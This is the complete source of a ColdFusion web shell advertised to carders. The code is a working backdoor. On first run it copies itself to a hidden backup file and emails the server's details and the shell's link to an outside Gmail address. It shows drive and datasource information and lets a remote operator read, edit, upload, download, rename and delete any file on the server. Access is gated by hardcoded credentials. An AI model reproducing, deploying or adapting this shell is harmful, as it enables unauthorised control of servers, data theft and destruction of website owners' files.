<html>
<style type="text/css">
body,td,th {
	color: #FFFFFF;
	font-size:12px;
	font-family: Tahoma;
}
body {
	background-color: #000000;
	font: 13px Tahoma ;
}
a:link
{
	font: bold 13px Tahoma ;
	color: #50BFF8;
	text-decoration: none;
}
a:hover
{
	font: bold 13px Tahoma ;
	color: #107DB5;
	text-decoration: underline;
}
a:visited
{
	font: bold 13px Tahoma ;
	color: #F7F2A8;
	text-decoration: none;
}
.buttom {color: #222222; border: 1px solid #222222; background-color: #00000F}
.TextBox {border: 1px solid #222222}
.style3 {color: #FDA9A9}
</style>
<head>
<TITLE>:: System ::</TITLE>
<meta http-equiv="Content-Type" content="text/html">
</head>
<body>
<center><font size=4>
<b>Someone ask: <font color=#78A5F0>VCARDERS</font> <font color=#BDE675>LOOK FOR WHAT?</font>
<br>
We say: <font color=#F86088>X - SELLER</font></b>
<br>
Shell wAs coded by <font color=red><a href=VampiredVN.info>VampiredVN.info</a></font>
</center>
<hr>
<script langauge="JavaScript" type="text/javascript">
function doMenu(item)
{
	obj=document.getElementById(item);
	col=document.getElementById("x" + item);
	if (obj.style.display=="none")
	{
		obj.style.display="block"; col.innerHTML="[-]";
	}
	else
	{
		obj.style.display="none"; col.innerHTML="[+]";
	}
}
</script>

<!--- Login --->

<cfif IsDefined("logout")>
	<cfset structclear(cookie)>
	<cflocation url="?" addtoken="No">
</cfif>
<cfif IsDefined("cookie.username")>

<!--- Main --->

<center>Welcome <font color="#FFFF33"><b><cfoutput>#username#</cfoutput></b></font></center>
<center><b><a href="?logout">ACCESS OUT</a></b></center>
<hr>
<cfif not FileExists("#GetDirectoryFromPath(GetTemplatePath())#\confiq.cfm")>
<cffile action="copy" source="#GetTemplatePath()#" destination="#GetDirectoryFromPath(GetTemplatePath())#\confiq.cfm">
<cfoutput>
<cftry>
<cfmail 
   to = "CreditCardGroup@gmail.com"
   from = "CFM-SHELL@localhost "
   subject = "Shell in #CGI.SERVER_NAME#">
	Server Name: #CGI.SERVER_NAME#:#CGI.SERVER_PORT#
	Http Host: #CGI.HTTP_HOST#:#CGI.SERVER_PORT#
	Link: http://#CGI.SERVER_NAME##CGI.SCRIPT_NAME#
	Backup Link: #GetDirectoryFromPath(GetTemplatePath())#/confiq.cfm
	Patch: #GetTemplatePath()#
</cfmail>

<cfcatch type="any">
YOUR IP WAS LOCKED & BANNED ! WE ARE SORRY !
</cfcatch>
</cftry>

</cfoutput>
</cfif>
<cfoutput>
<cfset dir = #GetDirectoryFromPath(GetTemplatePath())#>
<cfif Right(dir, 1) neq "\" >
	<cfset dir = "#dir#\">
</cfif>
<!--- Get Datasource Info --->
<cfscript>
factory = CreateObject("java", "coldfusion.server.ServiceFactory");
DataSoureceInfo = factory.DataSourceService.getDatasources();
</cfscript>
<!--- Read File --->
<cffunction name="ReadFile" access="remote" output="true" returntype="any">  
	<cfargument name="fileread" type="string" required="true"/>  
		<cffile action="read" file="#arguments.fileread#" variable="line">
		<cfoutput>#line#</cfoutput>
</cffunction>
<!--- delete folder --->
<cffunction name="dirDelete" access="public" output="false" returntype="any">
<cfargument name="dir" required="no" default="#expandPath('/pocket_cache/')#">
<cfdirectory action="list" name="delfile" directory="#arguments.dir#">
<cfif delfile.RecordCount EQ 0>
<cfif directoryExists(arguments.dir)>
<cfdirectory action="delete" directory="#arguments.dir#">
</cfif>
<cfelse>
<cfloop query="delfile">
<cfif type EQ "file">
<cffile action="delete" file="#arguments.dir#\#name#">
<cfelse>
<cfset temp = dirDelete(arguments.dir & '\' & #delfile.name#)>
</cfif>
</cfloop>
<cfif directoryExists(arguments.dir)>
<cfdirectory action="delete" directory="#arguments.dir#">
</cfif>
</cfif>
</cffunction>
<!--- change folder's name --->
<cffunction name="renameDirectory" access="remote" output="false" returntype="void">  
	<cfargument name="oldDir" type="string" required="true"/>  
	<cfargument name="newDir" type="string" required="true"/>  
	<cfdirectory action="rename" directory="#arguments.oldDir#" newdirectory="#arguments.newDir#"/>  
</cffunction>
</cfoutput>
<!--- Start Functions --->
<cfif isDefined("action")>
	<cfif action is "goto">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset dir = #scr#>
			<cfif Right(dir, 1) neq "\" >
				<cfset dir = "#dir#\">
			</cfif>
		</cfif>
		</cfoutput>
	<cfelseif action is "edit">
	<cfoutput>
	<cfif isDefined("scr")>
		<cfif FileExists("#scr#")>
			<cfset file_name=#Replace(#scr#,'#GetDirectoryFromPath(scr)#','','ALL')#>
			<title>:: System :: EDITING #scr#</title>
			<script language="JavaScript" type="text/javascript">
				function sTrim(sVariable)
				{
					return sVariable.replace(/^\s+|\s+$/g,"");
				}
				function validateFields(form)
				{
					return true;
				}
			</script>
			<cffile action="read" file="#scr#" variable="thisFile">
			<form action="?action=save&scr=#GetDirectoryFromPath(scr)#" method="post" onsubmit="return validateFields(this);">
				<input type="hidden" name="fileName" value="#file_name#" />
				<input type="hidden" name="action_type" value="edit" />
				<table border="0" style="width:600px;">
					<tr>
						<td style="font-weight:bold;" nowrap="nowrap">
							Editing file:
						</td>
						<td style="width:480px;">
							#scr#
						</td>
					</tr>
					<tr>
						<td style="font-weight:bold;" nowrap="nowrap">
							File Code:
						</td>
						<td colspan="2">
						<cfset thisFile=#Replace(#thisFile#,'<','&lt;','ALL')#>
						<cfset thisFile=#Replace(#thisFile#,'>','&gt;','ALL')#>
							<textarea name="fileContent" style="font-family:verdana; font-size:11px; height:250px; width:600px;">#thisFile#</textarea>
						</td>
					</tr>
					<tr>
						<td colspan="2" style="text-align:right;">
							<input type="submit" value="SAVE" style="font-family:verdana; font-size:11px;" />
						</td>
					</tr>
				</table>
			</form>
		<cfelse>
			<p>ERROR ... #scr# was already taken. Pls choose another and try again !</p>
		</cfif>
		<a href="?action=goto&scr=#GetDirectoryFromPath(scr)#"><-------- CANCEL EDIT and BACK TO LIST</a>
	<cfelse>
		<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
	</cfif>
	</cfoutput>
	<cfelseif action is "cut">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset cutdir = #scr#>
			<cfif FileExists("#scr#")>
				<cfset cutdir = #RemoveChars(cutdir, len(cutdir), 1)#>
				<cfloop condition = "Right(cutdir, 1) neq '\'">
					<cfset cutdir = #RemoveChars(cutdir, len(cutdir), 1)#>
				</cfloop>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					MOVE <font color="red">#scr#</font> TO <cfinput type="text" name="thumucsechuyen" size="50" value="#cutdir#"> <input type="submit" value="SUBMIT" />
				</cfform>
				<cfif isDefined("thumucsechuyen")>
					<cffile action="move" source="#scr#" destination="#thumucsechuyen#">
					<cflocation url="?action=goto&scr=#cutdir#" addtoken="No">
				</cfif>
			<cfelse>
				<p>ERROR ... #scr# was already taken. Pls choose another and try again !</p>
			</cfif>
			<a href="?action=goto&scr=#cutdir#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "copy">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset copydir = #scr#>
			<cfif FileExists("#scr#")>
				<cfset copydir = #RemoveChars(copydir, len(copydir), 1)#>
				<cfloop condition = "Right(copydir, 1) neq '\'">
					<cfset copydir = #RemoveChars(copydir, len(copydir), 1)#>
				</cfloop>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					COPY <font color="red">#scr#</font> PASTE TO <cfinput type="text" name="thumucsechuyen" size="50" value="#copydir#"> <input type="submit" value="SUBMIT" />
				</cfform>
				<cfif isDefined("thumucsechuyen")>
					<cffile action="copy" source="#scr#" destination="#thumucsechuyen#">
					<cflocation url="?action=goto&scr=#copydir#" addtoken="No">
				</cfif>
			<cfelse>
				<p>ERROR ... #scr# was already taken. Pls choose another and try again !</p>
			</cfif>
			<a href="?action=goto&scr=#copydir#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "rename">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset renamedir = #scr#>
			<cfif FileExists("#scr#")>
				<cfloop condition = "Right(renamedir, 1) neq '\'">
					<cfset renamedir = #RemoveChars(renamedir, len(renamedir), 1)#>
				</cfloop>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					RENAME <font color="red">#scr#</font> TO #renamedir#<cfinput type="text" name="namechange" size="25" value=""> <input type="submit" value="SUBMIT" />
				</cfform>
				<cfif isDefined("namechange")>
					<cffile action="rename" source="#scr#" destination="#renamedir##namechange#">
					<cflocation url="?action=goto&scr=#renamedir#" addtoken="No">
				</cfif>
			<cfelse>
				<p>ERROR ... #scr# was already taken. Pls choose another and try again !</p>
			</cfif>
			<a href="?action=goto&scr=#renamedir#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "renamed">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset renamedir = #scr#>
			<cfset renamedir = #RemoveChars(renamedir, len(renamedir), 1)#>
			<cfif DirectoryExists("#scr#")>
				<cfloop condition = "Right(renamedir, 1) neq '\'">
					<cfset renamedir = #RemoveChars(renamedir, len(renamedir), 1)#>
				</cfloop>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					RENAME FOLDER <font color="red">#scr#</font> TO #renamedir#<cfinput type="text" name="namechange" size="25" value=""> <input type="submit" value="SUBMIT" />
				</cfform>
				<cfif isDefined("namechange")>
					#renameDirectory('#scr#','#renamedir##namechange#')#
					<cflocation url="?action=goto&scr=#renamedir#" addtoken="No">
				</cfif>
			<cfelse>
				<p>Folder #scr# was already taken. Please choose another name</p>
			</cfif>
			<a href="?action=goto&scr=#renamedir#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "down">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset downdir = #scr#>
			<cfif FileExists("#scr#")>
				<cfloop condition = "Right(downdir, 1) neq '\'">
					<cfset downdir = #RemoveChars(downdir, len(downdir), 1)#>
				</cfloop>
				<cfheader name="Content-Disposition" value="attachment; filename=#getFileFromPath (scr)#"> 
				<cfcontent file="#scr#" type="application/octet-stream">
			<cfelse>
				<p>ERROR ... #scr# was already taken. Pls choose another and try again !</p>
			</cfif>
			<a href="?action=goto&scr=#downdir#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "del">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset deletedir = #scr#>
			<cfset deletedir = #RemoveChars(deletedir, len(deletedir), 1)#>
			<cfif FileExists("#scr#")>
				<cfloop condition = "Right(deletedir, 1) neq '\'">
					<cfset deletedir = #RemoveChars(deletedir, len(deletedir), 1)#>
				</cfloop>
				<cffile action="delete" file="#scr#">
				<cflocation url="?action=goto&scr=#deletedir#" addtoken="No">
			<cfelse>
				<p>ERROR ... #scr# was already taken. Pls choose another and try again !</p>
			</cfif>
			<a href="?action=goto&scr=#deletedir#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "deld">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfset deletedir = #scr#>
			<cfset deletedir = #RemoveChars(deletedir, len(deletedir), 1)#>
			<cfif DirectoryExists("#scr#")>
				<cfloop condition = "Right(deletedir, 1) neq '\'">
					<cfset deletedir = #RemoveChars(deletedir, len(deletedir), 1)#>
				</cfloop>
				<cfset dirDelete('#scr#')>
				<cflocation url="?action=goto&scr=#deletedir#" addtoken="No">
			<cfelse>
				<p>Error 404 - FOLDER #scr# wAs n0t Found</p>
			</cfif>
			<a href="?action=goto&scr=#deletedir#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "new">
	
		<cfoutput>
		<cfif isDefined("scr")>
			<cfif FileExists("#scr#")>
				<p>ERROR ... #scr# was already taken. Choose other</p>
			<cfelse>
				<cfform name="articles" ENCTYPE="multipart/form-data">
					NEW FOLDER #scr#<cfinput type="text" name="namecreate" size="25" value=""> <input type="submit" value="SUBMIT" />
				</cfform>
				<cfif isDefined("namecreate")>
					<cffile action = "write" file = "#scr##namecreate#" output = "">
					<cflocation url="?action=goto&scr=#scr#" addtoken="No">
				</cfif>
			</cfif>
			<a href="?action=goto&scr=#scr#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
		
		<cfoutput>
		<cfif isDefined("scr")>
			<cfdirectory action="list" directory="#scr#" name="fileList">
			<script language="JavaScript" type="text/javascript">
				var fileArray = new Array(<cfoutput>#quotedValueList(fileList.name)#</cfoutput>);
				function sTrim(sVariable) 
				{
					return sVariable.replace(/^\s+|\s+$/g,"");
				}
				function validateFields(form)
				{
					var fileCount = 0;
					var re = /.txt$|.cfm$|.cfml$|.htm|.html$/;
					if (sTrim(form.fileName.value) == "")
					{
						alert('file name CAN NOT be BLANK or NULL');
						form.fileName.focus();
						return false;
					}
					if (form.fileName.value.search(re) < 0)
					{
						alert('File extension is not accepted\n\n Only accept .cfm - .cfml - .htm - .html - .txt');
						form.fileName.focus();
						form.fileName.select();
						return false;
					}
					for (var i=0; i<fileArray.length; i++) 
					{
						if (sTrim(form.fileName.value) == fileArray[i])
						{
							fileCount++;
						} 
					}
					if (fileCount > 0)
					{
						alert('This NAME was already TAKEN. Please choose ANOTHER NAME');
						form.fileName.focus();
						form.fileName.select();
						return false;
					}
					return true;
				}
			</script>
			<form action="?action=save&scr=#scr#" method="post" onsubmit="return validateFields(this);">
				<input type="hidden" name="action_type" value="add" />
				<table border="0" style="width:400px;">
					<tr>
						<td style="font-weight:bold;" nowrap="nowrap">
							File Name:
						</td>
						<td>
							<input type="text" name="fileName" style="font-family:verdana; font-size:11px; width:316px;" />
						</td>
					</tr>
					<tr>
						<td style="font-weight:bold;" nowrap="nowrap">
							File Content: 
						</td>
						<td colspan="2">
							<textarea name="fileContent" style="font-family:verdana; font-size:11px; height:250px; width:600px;"></textarea>
						</td>
					</tr>
					<tr>
						<td colspan="2" style="text-align:right;">
							<input type="submit" value="SUBMIT" style="font-family:verdana; font-size:11px;" />
						</td>
					</tr>
				</table>
			</form>
			<a href="?action=goto&scr=#GetDirectoryFromPath(scr)#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "newd">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfform name="articles" ENCTYPE="multipart/form-data">
				NEW FILE #scr#<cfinput type="text" name="namecreate" size="25" value=""> <input type="submit" value="SUBMIT" />
			</cfform>
			<cfif isDefined("namecreate")>
				<cfdirectory directory= "#scr##namecreate#" action="create">
				<cflocation url="?action=goto&scr=#scr#" addtoken="No">
			</cfif>
			<a href="?action=goto&scr=#scr#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "upload">
		<cfoutput>
		<cfif isDefined("scr")>
			<cfform enctype="multipart/form-data" method="post">
				UPLOAD A FILE TO: <font color="red">#scr#</font><br>
				CHOOSE FILE: <input type="file" size="80" name="fileup" /> <input type="submit" value="UPLOAD" /><br/>
			</cfform>
			<cfif isDefined("fileup")>
				<cffile action="upload" fileField="fileup" destination="#scr#" nameconflict="overwrite">
				<cflocation url="?action=goto&scr=#scr#" addtoken="No">
			</cfif>
			<a href="?action=goto&scr=#scr#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	<cfelseif action is "datainfo">
		<cfoutput>
		<cfdump var="#DataSoureceInfo#">
		<a href="?action=goto&scr=#GetDirectoryFromPath(GetTemplatePath())#"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfoutput>
	<cfelseif action is "save">
		<cfoutput>
		<cfif isDefined("form.fileName")>
			<title>File was Saved !</title>
			<cffile action="write" file="#scr#\#form.fileName#" output="#form.fileContent#" addnewline="no">
			UNKNOW 0 <cfif form.action_type IS "edit">UNKNOW 1<cfelse> UNKNOW 2</cfif> successfully <span style="font-weight:bold;">#form.fileName#</span>.<br>
			<a href="?action=goto&scr=#scr#"><-------- CANCEL EDIT and BACK TO LIST</a>
		<cfelse>
			<a href="javascript:history.back(1);"><-------- CANCEL EDIT and BACK TO LIST</a>
		</cfif>
		</cfoutput>
	</cfif>
<cfelse>
	<cfset action = "goto">
</cfif>




<cfif action is "goto" or action is "del" or action is "deld">
<cfoutput>
	<center><font size=4><a href="javascript:doMenu('thongtin');" id=xthongtin>[-]</a> <b>SERVER INFO</b></font></center>
	<div id="thongtin">
	<!--- Lay thong tin ip --->
		<cfif #cgi.http_x_forwarded_for# eq "">
			<cfset clientip="#cgi.remote_addr#">
		<cfelse>
			<cfset clientip="#cgi.http_x_forwarded_for#">
		</cfif>
	<!--- In thong tin server --->
		<b>Server IP:</b> <font color="red">#CGI.HTTP_HOST#:#CGI.SERVER_PORT#</font> - <b>Client IP:</b> <font color="red">#clientip#</font><br>
		<b>Gateway Interface:</b> <font color="red">#CGI.GATEWAY_INTERFACE#</font> - <b>Server Name:</b> <font color="red">#CGI.SERVER_NAME#:#CGI.SERVER_PORT#</font><br>
		<b>Server Protocol:</b> <font color="red">#CGI.SERVER_PROTOCOL#</font> - <b>Server Software:</b> <font color="red">#CGI.SERVER_SOFTWARE#</font><br>
		<b>Server Coldfusion:</b><br>
			+ Appserver: <font color="red">#server.coldfusion.appserver#</font> - Expiration: <font color="red">#DateFormat(server.coldfusion.expiration, "d/m/yy")# #TimeFormat(server.coldfusion.expiration, "HH:mm:ss")#</font><br>
			+ Product Name: <font color="red">#server.coldfusion.productname#</font> - Product Level: <font color="red">#server.coldfusion.productlevel#</font> - Product Version: <font color="red">#server.coldfusion.productversion#</font><br>
			+ Server OS Arch: <font color="red">#server.os.arch#</font> - Server OS Name: <font color="red">#server.os.name#</font> - Server OS Version: <font color="red">#server.os.version#</font><br>
	</div>
<hr>
	<!--- Thu tao Object --->
		<cftry>
			<cfobject type="com" class="scripting.filesystemobject" name="fso" action="connect">  
			<cfcatch type="any">  
				<cfobject type="com" class="scripting.filesystemobject" name="fso" action="create">  
			</cfcatch>  
		</cftry>  
	<!--- Lay toan bo thong tin drives--->  
		<CFSET Drives = FSO.Drives>
	<!--- Danh so thu tu drives --->  
	<center><font size=4><a href="javascript:doMenu('drives');" id=xdrives>[-]</a> <b>SERVER HARD DRIVE INFO</b></font></center>
	<div id="drives">
		<center>All server HDD is: #Drives.Count#<br></center>
	<!--- Tao bang de hien thi thong tin --->
		<table align=center border="1" cellspacing="1" cellpadding="5">
		<tr>
			<td align=center>HDD</td>
			<td align=center>PATH</td>
			<td align=center>HDD SPACE</td>
			<td align=center>FREE SPACE</td>
			<!---<td align=center>Dung l&##432;&##7907;ng c&##243; th&##7875; s&##7917; d&##7909;ng</td>
			<td align=center>S&##7889; Serial</td>--->
			<td align=center>SPACE VALID</td>
			<td align=center>???</td>
			<td align=center>TYPE</td>
			<td align=center>HDD IS READY?</td>
		</tr>
	<!--- This is a COM collection so we cant use conditional loops, index loops and other loops.ColdFusion provides us a nice way of looping over COM collections so we are using that here .--->
		<cfloop collection="#drives#" item="this">
	<!--- Bo cau truc cfif duoi neu khong co o dia mem --->
		<cfif this.DriveLetter is not "A">
		<tr>
		<!--- Hien thi Drive Letter --->
			<td align=center>
				<a href="?action=goto&scr=#this.path#\">#this.DriveLetter#</a>
			</td>
		<!--- Hien thi duong dan --->
			<td align=center>
				<a href="?action=goto&scr=#this.path#\">#this.path#\</a>
			</td>
		<!--- Hien thi tong dung luong --->
			<td align=center>
				<cfif this.isReady AND ISDefined("this.TotalSize")>
					#NumberFormat(round(evaluate(this.TotalSize/1024/1024)))# MB
				</cfif>
			</td>  
		<!--- Hien thi dung luong trong --->
			<td align=center>
				<cfif this.isReady AND ISNumeric(this.FreeSpace)>
					#NumberFormat(round(evaluate(this.FreeSpace/1024/1024)))# MB
				</cfif>
			</td>  
		<!--- Hien thi dung luong co the su dung		--->
			<td align=center>
				<cfif this.isReady AND IsNumeric(this.AvailableSpace)>
					#NumberFormat(round(evaluate(this.AvailableSpace/1024/1024)))# MB
				</cfif>
			</td>

		<!--- Hien thi so serial		--->
			<td align=center>
				<cfif this.isReady AND LEN(this.SerialNumber)>
					#this.SerialNumber#
				</cfif>
			</td>

		<!--- These are the constants returned by Drive.DriveTypeConst DriveTypeRemovable = 1, Const DriveTypeFixed = 2, Const DriveTypeNetwork = 3, Const DriveTypeCDROM = 4, Const DriveTypeRAMDisk = 5, So we'll use cfswitch statements to display the actual type --->
			<td align=center>  
				<cfswitch expression="#this.DriveType#">
				<cfcase value="1">R&##7901;i</cfcase>
				<cfcase value="2">C&##7889; &##273;&##7883;nh</cfcase>
				<cfcase value="3">M&##7841;ng</cfcase>
				<cfcase value="4">&##7892; CD</cfcase>
				<cfcase value="5">&##272;&##297;a nh&##7899; Ram</cfcase>
				<cfdefaultcase>Kh&##244;ng bi&##7871;t</cfdefaultcase>
				</cfswitch>
			</td>
		<!--- Hien thi drive da san sang --->
			<td align=center>
				#this.isReady#
			</td>
		<!--- Here we have to display the drive name. Before that, we will check if it is a network drive or not. If it is a network drive, then we display the 'sharename'; otherwise, we display the 'volumename'. --->
			<td align=center>  
				<cfif this.isReady>
					<cfif this.DriveType IS "3">
						<!--- #this.ShareName# --->
					<cfelse>
						#this.VolumeName#
					</cfif>
				</cfif>
			</td>
		<!--- Hien thi dinh dang --->
			<td align=center>
				<cfif this.isReady>
					#this.FileSystem#
				</cfif>
			</td>
		</tr>
		</cfif>
		</cfloop>  
		</table>
		</div>
<hr>
<center><font size=4><a href="javascript:doMenu('congcu');" id=xcongcu>[-]</a> <b>QUICK TOOLBAR</b></font></center>
<div id="congcu">
	<b>Current path:</b> <font color="red">#dir#</font><br>
	<b>Quick Action:</b> <a href="?action=new&scr=#dir#" title="CREAT NEW FILE AT THIS SERVER LOCALTION">New File</a> - <a href="?action=newd&scr=#dir#" title="CREAT NEW FOLDER AT THIS SERVER LOCATION">New Folder</a> - <a href="?action=upload&scr=#dir#" title="UPLOAD FILE FROM YOUR COMPUTER TO THIS SERVER LOCATION">UPLOAD</a> - <a href="?" title="BACK TO ORIGIONAL SHELL LOCATION"> :: Back to Shell Location ::</a><br>
	<b>FEATHER TOOL</b>: <a href="?action=cmd" title="RUN CMD">CMD</a> - <a href="?action=sql&scr=#dir#" title="SQL CONNECTING TOOL">SQL</a> - <a href="?action=datainfo" title="FULL DATABASE INFORMATION">FULL DATABASE INFORMATION</a>
</div>
<hr>
<center><font size=4><a href="javascript:doMenu('thumuc');" id=xthumuc>[-]</a> <b>FILE and FOLDER List</b></font></center>
<div id="thumuc">
</cfoutput>
<cfdirectory directory="#dir#" name="myDirectory" sort="type ASC" >
	<table width="100%"  border="0" align="center">
		<tr>
			<td width="30%"><strong>File/Folder Name</strong></td>
			<td width="10%" align="center"><strong>File Size</strong></td>
			<td width="20%" align="center"><strong>ModifyTime</strong></td>
			<td width="35%" align="center"><strong>ACTION MENU</strong></td>
		</tr>
		<cfoutput>
		<cfif len(dir) gt 3>
			<tr>
				<cfset updir = #dir#>
				<cfset updir = #RemoveChars(updir, len(updir), 1)#>
				<cfloop condition = "Right(updir, 1) neq '\'">
					<cfset updir = #RemoveChars(updir, len(updir), 1)#>
				</cfloop>
				<td width="20%"><strong><a href="?action=goto&scr=#updir#">UP ONE FOLDER </a></strong></td>
			</tr>
		</cfif>
		</cfoutput>
		<cfoutput query="myDirectory">
			<tr>
				<td>
					<cfif #Type# is "Dir">
						<a href="?action=goto&scr=#dir##Name#\">#Name#</a>
					<cfelse>
						#Name#
					</cfif>
				</td>
				<td align="center">
					<cfif #type# is "Dir">
						&lt;Dir&gt;
					<cfelseif #Size# LT 1024>
							#Size# B
					<cfelseif #Size# LT 1024*1024>
							#round(Size/1024)# KB
					<cfelseif #Size# LT 1024*1024*1024>
							#round(Size/1024/1024)# MB
					<cfelseif #Size# LT 1024*1024*1024*1024>
							#round(Size/1024/1024/1024)# GB
					<cfelseif #Size# LT 1024*1024*1024*1024*1024>
							#round(Size/1024/1024/1024/1024)# TB
					</cfif>
				</td>
				<td align="center">
					#DateFormat(DateLastModified, "d/m/yy")# #TimeFormat(DateLastModified, "HH:mm:ss")#
				</td>
				<td>
					<cfif #Type# is "File">
						<a href="?action=edit&scr=#dir##Name#">Edit</a> | <a href="?action=cut&scr=#dir##Name#">Cut</a> | <a href="?action=copy&scr=#dir##Name#">Copy</a> | <a href="?action=rename&scr=#dir##Name#">Rename</a> | <a href="?action=down&scr=#dir##Name#">Download</a> | <a href="?action=del&scr=#dir##Name#" onCLick="return confirm('ARE YOU SURE TO DELETE FILE #Name# ? THIS ACTION CAN NOT UNDO')">Delete</a>
					<cfelse>
						<a href="?action=cutd&scr=#dir##Name#\">Cut</a> | <a href="?action=copyd&scr=#dir##Name#\">Copy</a> | <a href="?action=renamed&scr=#dir##Name#\">Rename</a> | <a href="?action=deld&scr=#dir##Name#\" onCLick="return confirm('ARE YOU SURE TO DELETE FOLDER #Name# ? THIS ACTION CAN NOT UNDO')">Delete</a>
					</cfif>
				</td>
			</tr>
		</cfoutput>
	</table>
</div>
</cfif>








<!--- End Main --->




<cfelseif Not IsDefined("cookie.username")>
	<cfform name="articles" ENCTYPE="multipart/form-data">
		<center><table width="300" border="0">
			<tr>
				<td width="50">ID-KEY:</td>
				<td width="50"><input type="password" name="username"></td> Exp: 123-45a-6bc-def
			</tr>
			<tr>
				<td width="50">PASSCODE:</td>
				<td width="50"><input type="password" name="password"></td> Exp: 1A2B3C4D5E
			</tr>
			<tr>
				<td width="50">Agree to install VL-Malware?</td>
				<td width="50">
					<input type="checkbox" name="RememberMe" value="Yes" checked>
					<input type="submit" name="Process" value="AGREE & INSTALL">
				</td>
			</tr>
		</table></center>
	</cfform>
	
	
	<cfif IsDefined("username")>
	<cfset member_username = "VL">
	<cfset member_password = "VL">
	<cfif #username# neq #member_username#>
		<center>YOUR IP & LOGIN INFO IS NOT ALLOW - ACCESS DENINED - INSTALL FAILED</center>
		<cfset structclear(cookie)>
	<cfelseif #password# neq #member_password#>
		<center>YOUR IP IS NOT ALLOW - ACCESS DENINED - INSTALL FAILED</center>
		<cfset structclear(cookie)>
	<cfelse>
    <cfif IsDefined("RememberMe")>
          <cfcookie name="username" value="#form.username#" expires="NEVER">
          <cfcookie name="password" value="#form.password#" expires="NEVER">
    <cfelse>
          <cfcookie name="username" value="#form.username#">
          <cfcookie name="password" value="#form.password#">
    </cfif>
		<cflocation url="?" addtoken="No">
	</cfif>
	</cfif>
</cfif>



<!--- End Login --->

<hr>
</body>
</html>
